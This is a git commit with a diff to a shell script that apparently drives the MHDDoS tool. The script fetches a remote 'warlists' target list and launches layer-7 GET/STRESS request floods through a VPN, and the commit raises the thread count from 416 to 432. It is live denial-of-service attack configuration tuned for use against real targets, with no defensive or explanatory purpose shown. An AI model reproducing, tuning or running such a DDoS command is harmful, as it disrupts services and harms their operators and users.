afdd0fe7d30a663f31ab739f75129f045ab818ec
Flux State <f1ux.state@pm.me>
2022-05-08 22:45:13 +0200

    mhddos for vpn

--- scripts/run_l7_get-stress.sh
+++ scripts/run_l7_get-stress.sh
@@ -6,5 +6,5 @@ python3 runner.py \
   --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_get-stress.lst \
   --debug \
   --http-methods GET STRESS \
-  --threads 416 \
+  --threads 432 \
   --vpn 50
